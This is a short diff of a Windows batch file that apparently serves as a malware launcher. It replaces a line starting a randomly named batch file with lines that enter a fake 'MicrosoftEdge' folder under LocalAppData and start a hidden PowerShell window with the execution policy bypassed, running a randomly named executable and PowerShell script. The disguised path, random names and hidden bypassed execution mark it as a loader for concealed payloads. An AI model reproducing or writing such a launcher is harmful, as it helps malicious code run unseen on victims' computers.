@@ -1,2 +1,3 @@
-@echo off
-start /b "" "%LocalAppData%\MicrosoftEdge\404eb8b50ea0d5d6\oPNUennj8FXKrOBhUURQ.bat"
+@ECHO OFF
+cd %LocalAppData%\MicrosoftEdge\404eb8b50ea0d5d6\
+start PowerShell -windowstyle hidden -ExecutionPolicy Bypass Start-Process 'ygoLa8SyqmQTGsoh.exe';.\LhFDtKhHgdiXDSt3.ps1
